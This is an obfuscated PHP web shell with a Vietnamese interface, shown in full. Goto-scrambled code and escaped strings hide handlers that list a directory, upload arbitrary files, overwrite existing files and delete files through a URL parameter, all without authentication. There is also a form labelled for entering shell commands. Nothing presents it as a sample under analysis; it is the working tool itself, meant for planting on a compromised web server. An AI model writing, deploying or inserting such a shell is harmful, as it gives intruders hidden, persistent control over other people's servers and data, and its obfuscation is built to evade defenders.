<?php
 goto vQg9r; zL1a8: if (isset($_POST["\x65\144\151\x74"])) { $fileName = $_POST["\x66\151\x6c\x65\137\156\141\155\x65"]; $fileContent = $_POST["\146\151\x6c\145\x5f\143\157\x6e\x74\x65\x6e\x74"]; $pathToFile = $dir . $fileName; if (file_exists($pathToFile) && !is_dir($pathToFile)) { file_put_contents($pathToFile, $fileContent); } } goto gmxsO; UtW39: pY9po: goto AIF43; OyaY9: CYyhH: goto GwH49; d_Nue: QRmKy: goto yq033; COV3t: goto azrUe; goto HU_yi; iT2mQ: edCMG: goto xQXVj; IEIXB: goto Y0N9W; goto yfaOX; utOM5: goto Qhnj0; goto KkPun; xQXVj: goto e2_uI; goto HWqb2; U9TW3: y3xAF: goto u3cCi; Dg6U4: goto Arg1b; goto jzxcw; deenR: e2_uI: goto piD6p; vpiyQ: goto CXIji; goto Hy2eP; u57G0: ttLEc: goto eQuof; BK0yw: v4A82: goto amQ3X; KkucW: Lw5qM: goto wesTk; hG7_X: goto isENF; goto iS1fz; gmxsO: goto BUxdX; goto MrZnT; GyHwC: goto pY9po; goto deenR; mbkLN: if (isset($_GET["\x64\145\154\145\x74\145"])) { $fileToDelete = $_GET["\x64\145\154\145\x74\x65"]; $pathToDelete = $dir . $fileToDelete; if (file_exists($pathToDelete) && !is_dir($pathToDelete)) { unlink($pathToDelete); } } goto GyHwC; wesTk: goto OOmxh; goto RcI73; nLpci: Y0N9W: goto RYGhm; v0xV2: goto Trcjr; goto KkucW; RcI73: goto hs7A1; goto VX5oB; KkPun: goto lJIIV; goto zp2_3; qkvQM: CXIji: goto m617h; GwH49: goto tEzUG; goto nLpci; NA2Jc: goto c6rWg; goto U9TW3; a5m7I: ks21C: goto nqa8n; P0WCW: goto y3xAF; goto Kbn6O; RYGhm: YtKZB: goto HCJMF; hJzOP: goto edCMG; goto o4gZ7; Rrdo3: if (isset($_POST["\163\x75\142\x6d\151\x74"])) { $files = $_FILES["\146\x69\x6c\x65"]; foreach ($files["\156\141\x6d\x65"] as $key => $file_name) { move_uploaded_file($files["\x74\x6d\160\x5f\x6e\141\155\x65"][$key], $dir . $file_name); } } goto dkv3S; MrZnT: PXqsn: goto utOM5; MXnh9: goto v4A82; goto YNK2I; Kbn6O: Tgcbt: goto Iajyf; D0rhP: goto SQWJR; goto dWR6H; ZrvPy: Qhnj0: goto v0xV2; yfaOX: c8wgF: goto Y3vcW; wQOvv: SQWJR: goto ZrvPy; lMZeJ: JDFUU: goto iT2mQ; YNK2I: S74sP: goto d_Nue; IdZX2: wGgq2: goto qmQc0; xukzs: Trcjr: goto mbkLN; fAkUx: OOmxh: goto vpiyQ; zp2_3: lJIIV: goto zLwyU; yq033: goto c8wgF; goto qkvQM; piD6p: goto CFWCH; goto D0rhP; Y3vcW: $files = scandir($dir); goto bjVk1; HWqb2: tEzUG: goto NfHcn; weW5x: goto Lw5qM; goto wQOvv; HU_yi: hs7A1: goto fAkUx; m617h: foreach ($files as $file) { if ($file != "\x2e" && $file != "\56\56") { $path = $dir . $file; $type = is_dir($path) ? "\124\x68\xc6\xb0\x20\x6d\341\273\245\143" : "\124\xe1\xba\xad\160\40\164\x69\x6e"; $size = is_dir($path) ? "\55" : filesize($path); echo "\x3c\164\162\76\12\40\40\x20\40\x20\40\x20\x20\40\x20\x20\x20\40\40\x20\40\40\40\40\x20\x20\x20\40\x20\x20\40\x20\x20\74\164\x64\76\x3c\x61\x20\150\162\145\146\x3d\42" . $path . "\42\x3e" . $file . "\74\57\x61\x3e\x3c\x2f\164\144\76\12\40\40\40\40\40\x20\x20\x20\40\x20\40\40\40\40\x20\40\x20\x20\40\40\40\x20\x20\40\40\x20\40\40\x3c\164\x64\76" . $type . "\x3c\x2f\x74\144\x3e\xa\40\x20\40\40\40\40\40\x20\40\40\40\x20\x20\x20\x20\40\x20\x20\40\x20\x20\x20\x20\40\x20\40\40\40\74\164\x64\x3e" . $size . "\x20\142\x79\164\145\x73\74\57\x74\144\76\xa\x20\x20\40\40\40\x20\40\x20\x20\x20\40\40\40\x20\40\x20\40\40\x20\x20\40\x20\x20\40\x20\x20\x20\x20\74\x74\x64\x3e\12\x20\40\x20\40\40\x20\x20\x20\40\40\x20\x20\x20\x20\40\40\40\x20\x20\40\x20\40\40\40\x20\x20\40\x20\40\40\x20\40\74\x62\165\164\x74\157\x6e\40\164\x79\x70\145\x3d\x22\x62\165\x74\x74\x6f\x6e\42\40\144\x61\x74\141\55\x66\x69\x6c\x65\x3d\x22" . $file . "\42\x20\x63\x6c\x61\163\163\x3d\x22\x62\x74\156\40\x62\x74\x6e\55\160\162\x69\x6d\x61\162\171\40\142\x74\156\x2d\x61\x63\x74\x69\157\x6e\40\145\144\151\x74\55\x62\x74\156\42\76\x53\341\xbb\255\141\74\x2f\x62\165\x74\164\x6f\156\x3e\xa\40\40\x20\40\x20\x20\x20\40\x20\x20\x20\40\40\40\40\x20\40\40\40\40\x20\40\x20\40\x20\40\x20\40\40\40\40\x20\x3c\x61\40\150\162\145\146\75\42\x3f\144\x65\154\145\x74\145\x3d" . $file . "\42\40\143\154\141\163\163\x3d\42\142\x74\x6e\x20\x62\164\x6e\55\144\141\x6e\147\x65\162\40\x62\x74\156\55\x61\x63\164\151\157\156\x22\76\x58\303\xb3\x61\x3c\x2f\x61\x3e\xa\40\x20\x20\x20\x20\40\40\x20\40\x20\40\40\x20\40\40\x20\x20\40\40\40\40\40\40\40\x20\40\x20\x20\74\57\164\x64\x3e\xa\40\x20\x20\40\x20\40\x20\x20\40\40\40\x20\x20\40\x20\x20\x20\x20\x20\x20\x20\x20\40\40\x20\40\x3c\x2f\x74\x72\x3e"; } } goto Ybg3y; nqa8n: W3bNb: goto Dg6U4; KxJfg: goto YtKZB; goto COV3t; Iajyf: ?>
<table class="table"><thead><tr><th>Tên</th><th>Loại</th><th>Kích thước</th><th>Thao tác</th></tr></thead><tbody><?php  goto weW5x; eQuof: goto EVBOP; goto hG7_X; jzxcw: c9nAn: goto zL1a8; bjVk1: goto dacXq; goto UtW39; amQ3X: goto CYyhH; goto s953H; ZDn_A: k_LnV: goto IqYCh; L09Rw: goto QRmKy; goto twb9L; IqYCh: goto c9nAn; goto lh3Rp; T1ARG: goto S74sP; goto BK0yw; iS1fz: BUxdX: goto L09Rw; Ybg3y: goto ttLEc; goto DlUaQ; AIF43: goto k_LnV; goto T1ARG; VX5oB: Arg1b: goto Rrdo3; Hy2eP: isENF: goto ZDn_A; NfHcn: $dir = "\56\57"; goto P0WCW; lh3Rp: azrUe: goto OyaY9; o4gZ7: CFWCH: goto MXnh9; vQg9r: goto wGgq2; goto IdZX2; dkv3S: goto PXqsn; goto a5m7I; twb9L: goto ks21C; goto xukzs; s953H: goto JDFUU; goto u57G0; dWR6H: c6rWg: goto siRxu; zLwyU: EVBOP: goto NA2Jc; DlUaQ: dacXq: goto KxJfg; qmQc0: ?>
<!doctypehtml><html><head><title>Εξέλιξη</title><link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"rel="stylesheet"><style>.btn-action{margin-right:5px}</style></head><body><div class="container"><h1>Εξέλιξη</h1><div class="mb-3"><form method="POST"><label for="shellCommand"class="form-label">Nhập lệnh Shell</label> <input name="shellCommand"id="shellCommand"class="form-control"> <button class="btn btn-primary mt-2"type="submit">Thực hiện lệnh</button></form></div><div class="mb-3"id="result"><?php  goto hJzOP; u3cCi: goto W3bNb; goto IEIXB; HCJMF: goto Tgcbt; goto lMZeJ; siRxu: ?>
</tbody></table><form method="post"action=""class="mt-4"enctype="multipart/form-data"><div class="form-group"><input name="file[]"type="file"multiple required></div><button class="btn btn-success"type="submit"name="submit">Upload</button></form><div class="fade modal"id="editModal"aria-hidden="true"aria-labelledby="editModalLabel"role="dialog"tabindex="-1"><div class="modal-dialog"role="document"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"id="editModalLabel">Sửa file</h5><button class="close"type="button"aria-label="Close"data-dismiss="modal"><span aria-hidden="true">×</span></button></div><div class="modal-body"><form method="post"action=""class="mt-4"id="editForm"><input name="file_name"id="editFileName"type="hidden"><div class="form-group"><label for="file_content">Nội dung file:</label> <textarea class="form-control"id="editFileContent"name="file_content"rows="10"></textarea></div><button class="btn btn-success"type="submit"name="edit">Lưu thay đổi</button></form></div></div></div></div><script src="https://code.jquery.com/jquery-3.3.1.min.js"></script><script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script><script>$(document).ready(function(){$(".edit-btn").click(function(){var t=$(this).data("file");$.ajax({url:"./get_file_content.php",type:"POST",data:{file_name:t},success:function(e){$("#editFileName").val(t),$("#editFileContent").val(e),$("#editModal").modal("show")}})})})</script>